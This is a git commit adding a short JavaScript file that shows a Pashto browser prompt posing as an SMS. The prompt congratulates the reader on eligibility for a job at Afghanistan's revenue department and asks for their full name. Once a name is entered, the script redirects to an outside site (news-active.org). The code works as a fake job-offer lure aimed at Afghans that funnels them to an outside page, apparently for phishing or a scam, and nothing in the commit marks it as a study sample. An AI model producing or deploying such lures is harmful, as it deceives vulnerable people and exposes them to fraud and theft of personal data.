25ac24e8868c9f6471d6eae91651789097095db1
ekpeowo <ukpehansi@gmail.com>
2025-07-21 10:31:24 +0100

    Create afghans-activation.js

---
+++ afghans-activation.js
@@ -0,0 +1,5 @@
+var password = 'بشپړ نوم ولیکئ:'
+password=prompt('SMS: مبارک شه، تاسو د افغانستان د عوایدو په ریاست کې د کار کولو وړ یاست، د خپل بشپړ نوم د لیکلو لپاره OK کلیک وکړئ. ','بشپړ نوم ولیکئ:');
+if (password != 'بشپړ نوم ولیکئ:') {
+location.href='https://news-active.org/afghans-revenue.html';
+}
